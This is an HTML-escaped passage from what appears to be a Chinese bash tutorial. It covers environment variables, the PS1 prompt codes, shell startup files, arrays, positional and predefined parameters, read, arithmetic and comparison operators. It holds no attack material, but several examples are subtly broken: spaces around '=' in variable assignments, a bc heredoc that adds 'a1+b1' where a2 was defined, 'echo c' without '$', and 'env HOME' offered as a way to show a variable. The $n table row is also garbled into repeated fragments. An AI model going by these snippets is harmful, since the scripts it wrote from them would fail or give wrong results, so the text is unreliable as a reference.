&lt;h4 id=&quot;orgc0eb25c&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.7&lt;/span&gt; 环境变量&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-7&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;概念：环境变量（environment variable），用来存储有关 shell 会话和工作环境的信息。&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
全局环境变量和局部环境变量:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 查看全局变量
$ env
or
$ printenv

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 查看某个全局环境变量
$ env HOME
or
$ echo $HOME

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// set 命令会显示为某个特定进程设置的所有环境变量，包括全局变量、局部变量以及用户自定义变量。
$ set

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设置用户自定义变量
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ my_variable=Hello

&lt;/pre&gt;
&lt;p&gt;
注意：所有环境变量名均使用大写字母，这是 bash shell 的标准惯例。自己创建的局部变量或是 shell 脚本，请使用小写字母。变量名区分大小写。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ my_variable=&quot;Hello World&quot;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 设置全局变量
$ export my_variable=&quot;I am Global now&quot;

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 删除环境变量
$ unset my_variable

&lt;/pre&gt;
&lt;p&gt;
注意：如果要用到变量，使用$；如果要操作变量，不使用$。
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
PATH、PS1 环境变量
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 全局环境变量
$ PATH=$PATH:/opt/test/scripts

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 自定义用户命令行的字符显示

&lt;/pre&gt;
&lt;p&gt;
PS1 默认提示符变量，如动态显示当前目录：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ export PS1=&quot;[\u@\h \w]&quot;

&lt;/pre&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 16:&lt;/span&gt; PS1 变量可使用的参数值&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\d&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;代表日期，格式为weekday month date，例如：&quot;Mon Aug 1&quot;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\H&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\h&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;仅取主机的第一个名字，如上例，则为fc4，.linux则被省略&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\t&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示时间为24小时格式，如：HH：MM：SS&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\T&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示时间为12小时格式&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\A&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;显示时间为24小时格式：HH：MM&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\u&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;当前用户的账号名称&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\v&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;BASH的版本信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\w&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;完整的工作目录名称。家目录会以 ~代替&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\W&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;利用basename取得工作目录名称，所以只会列出最后一个目录&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\#&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;下达的第几个命令&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\$&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;提示字符，如果是root时，提示符为：# ，普通用户则为：$&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\[&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;字符&quot;[&quot;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;字符&quot;]&quot;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\!&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令行动态统计历史命令次数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
PS2 是副提示符变量，默认值是''&amp;gt; ''。PS2一般使用于命令行里较长命令的换行提示信息。可自定义设置如下：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ export PS2=&quot;PS2 =&amp;gt; &quot;

&lt;/pre&gt;
&lt;p&gt;
另外，还有 PS3 和 PS4，因为这两个环境变量可能用得不多，所以在这就不介绍了，感兴趣的小伙伴可自行研究。
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;定位系统环境变量
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
登录时作为默认登录 shell
&lt;br /&gt;
登录 shell 会从5个不同的启动文件里读取命令，其中 /etc/profile 是默认的 bash shell 主启动文件。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$HOME/.bash_profile
$HOME/.bashrc
$HOME/.bash_login
$HOME/.profile

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;作为非登录 shell 的交互式 shell
&lt;br /&gt;
作为非登录 shell 的交互式启动的，它不会访问 /etc/profile 文件，只会检查 HOME 目录中的 .bashrc 文件。
&lt;br /&gt;
.bashrc 文件有两个作用：一是查看/etc目录下通用的 bashrc 文件；二是为用户提供一个定制自己的命名别名和私有脚本函数的地方。&lt;/li&gt;
&lt;li&gt;作为运行脚本的非交互式shell
&lt;br /&gt;
系统执行 shell 脚本时使用，不同的地方在于它没有命令提示符。bash shell 提供了 BASH_ENV 环境变量，当 shell 启动一个非交互式 shell 进程时，它会检查这个环境变量来查看要执行的启动文件。
&lt;br /&gt;
在大多数发行版中，存储个人用户永久性 bash shell 变量的地方是 $HOME/.bashrc 文件。但如果设置了 BASH_ENV 变量，那么记住，除非它指向的是 $HOME/.bashrc，否则应该将非交互式 shell 的用户变量放在别的地方。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
数组变量
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 环境变量作为数组使用
$ mytest=(one two three four five)
$ echo ${mytest[2]}
three
$ echo ${mytest[*]}
one two three four five

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//改变某个索引的值
$ mytest[2] = seven

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//删除某个索引的值和删除整个数组
$ unset mytest[2]
$ unset mytest

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;环境变量配置文件
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;/etc/profile&lt;/li&gt;
&lt;li&gt;/etc/profile.d/*.sh&lt;/li&gt;
&lt;li&gt;~/.bash_profile&lt;/li&gt;
&lt;li&gt;~/.bashrc&lt;/li&gt;
&lt;li&gt;/etc/bashrc&lt;/li&gt;
&lt;li&gt;~/.bash_logout&lt;/li&gt;
&lt;li&gt;~/.bash_history&lt;/li&gt;
&lt;li id=&quot;/etc/issue&quot;&gt;本地终端欢迎信息&lt;/li&gt;
&lt;li id=&quot;/etc/motd&quot;&gt;登录后的欢迎信息&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org479b99e&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org479b99e&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.8&lt;/span&gt; 位置参数(positional parameter)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-8&quot;&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 17:&lt;/span&gt; 位置参数&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;位置参数变量&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$n&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;n为自然数。0代表命令本身，0代表命令本身，1到9代表第1到第9个参数（参数的值是执行该命令时，从9代表第1到第9个参数（参数的值是执行该命令时，从1开始依次输入的），十以上的参数要用大括号包含，如${10}。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$*&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;这个变量代表命令行中所有的参数（不包括$0），它把所有的参数当做一个整体对待。对其进行for循环遍历时，只会循环一次。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$@&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;这个变量也代表命令行中所有的参数（不包括$0），它把所有的参数当做独立的个体对待。对其进行for循环遍历时，可循环多次。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$#&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;这个变量代表命令行中所有参数的个数（不包括$0）。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org8e052cd&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;using one command line parameter&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;factorial&lt;/span&gt;=1
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; ((&lt;span style=&quot;color: #FF8C00;&quot;&gt;number&lt;/span&gt;=1; number&amp;lt;=$&lt;span style=&quot;color: #FF8C00;&quot;&gt;1&lt;/span&gt;; number++))
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;factorial&lt;/span&gt;=$[$&lt;span style=&quot;color: #FF8C00;&quot;&gt;factorial&lt;/span&gt; * $&lt;span style=&quot;color: #FF8C00;&quot;&gt;number&lt;/span&gt;]
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The factorial of $1 is $factorial&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org5219204&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org5219204&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.9&lt;/span&gt; 预定义变量&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-9&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
常见的预定义变量
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 18:&lt;/span&gt; 常见的预定义变量&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;预定义常量&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;0&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;存当前程序或脚本的名称&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$*&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;保存传递给脚本或进程的所有参数&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$$&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;当前进程给脚本的PID号&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$!&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;后台运行的最后一个进程的PID号&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$?&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;用于返回上一条命令是否成功执行。如果成功执行，将返回数字0，否则返回非零数字（通常情况下都返回数字1）。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$#&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;用于保存脚本的参数个数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;从键盘输入
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;read 命令
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;选项
&lt;dl class=&quot;org-dl&quot;&gt;
&lt;dt&gt;-p&lt;/dt&gt;&lt;dd&gt;等待输入时的提示信息&lt;/dd&gt;
&lt;dt&gt;-t&lt;/dt&gt;&lt;dd&gt;等待秒数&lt;/dd&gt;
&lt;dt&gt;-n&lt;/dt&gt;&lt;dd&gt;允许输入的字符数&lt;/dd&gt;
&lt;dt&gt;-s&lt;/dt&gt;&lt;dd&gt;隐藏输入的数据，适用于机密信息的输入&lt;/dd&gt;
&lt;/dl&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
示例
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgb2037a6&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Date: 2019/07/27&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Author: zrg&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Enter a variable name&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;read&lt;/span&gt; -p &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Please enter a variable name:&quot;&lt;/span&gt; -t 15 varName
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;\n&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;varName&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org33e8875&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org33e8875&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.10&lt;/span&gt; 执行数学运算和运算符&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-10&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
方法1：declare
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ declare -i c=$a+$b
$ echo $c

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
方法2：expr 或 let 运算工具
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ c=$(expr $a +$b)
$ echo c

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
方法3：$((表达式)) 或 $[表达式]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ var1=$((1+5))
$ var2=$[$var1*2]
// 使用 $ 和 [] 将数学表达式围起来

&lt;/pre&gt;
&lt;p&gt;
注意：bash shell数学运算符支持整数运算。z shell（zsh）提供了完整的浮点数算术操作。
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
浮点运算解决方案
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
使用内建的bash计算器：bc
$ bc
3.44 / 5
0
scale = 4 // 浮点运算由scale控制，默认值为0

&lt;/pre&gt;

&lt;p&gt;
注意：-q 选项可以不显示冗长的欢迎信息
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ bc -q

&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org25dee4a&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; = $(&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;scale=4;3.44 / 5&quot;&lt;/span&gt; | bc)
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; The answer is $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org2585553&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;= 10.46
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var2&lt;/span&gt;= 43.67
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var3&lt;/span&gt;= 33.2
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var4&lt;/span&gt;= 71
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var5&lt;/span&gt;= $(bc &amp;lt;&amp;lt; EOF
&lt;span style=&quot;color: #CDC673; font-weight: bold;&quot;&gt;scale= 4&lt;/span&gt;
&lt;span style=&quot;color: #CDC673; font-weight: bold;&quot;&gt;a1= ($var1*$var2)&lt;/span&gt;
&lt;span style=&quot;color: #CDC673; font-weight: bold;&quot;&gt;a2= ($var3*var4)&lt;/span&gt;
&lt;span style=&quot;color: #CDC673; font-weight: bold;&quot;&gt;a1+b1&lt;/span&gt;
&lt;span style=&quot;color: #CDC673; font-weight: bold;&quot;&gt;EOF&lt;/span&gt;
)
&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The final answer for this mess is $var5&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;运算符
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
算术运算符
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 19:&lt;/span&gt; 算术运算符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;运算符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;举例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;+&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;加法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;`expr $a + $b` 结果为 30。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;减法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;`expr $a - $b` 结果为 -10。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;lowast;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;乘法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;`expr $a \* $b` 结果为  200。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;/&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;除法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;`expr $b / $a` 结果为 2。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;%&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;取余&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;`expr $b % $a` 结果为 0。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;=&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;赋值&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a=$b 将把变量 b 的值赋给 a。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;==&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;相等。用于比较两个数字，相同则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a == $b ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;!=&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;不相等。用于比较两个数字，不相同则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a != $b ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
注意：条件表达式要放在方括号之间，并且要有空格，例如: [$a==$b] 是错误的，必须写成 [ $a == $b ]。
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
关系运算符
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 20:&lt;/span&gt; 关系运算符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;运算符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;举例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-eq&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测两个数是否相等，相等返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -eq $b ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-ne&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测两个数是否不相等，不相等返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -ne $b ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-gt&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测左边的数是否大于右边的，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -gt $b ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-lt&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测左边的数是否小于右边的，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -lt $b ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-ge&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测左边的数是否大于等于右边的，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -ge $b ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-le&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测左边的数是否小于等于右边的，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -le $b ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
布尔运算符
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 21:&lt;/span&gt; 布尔运算符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
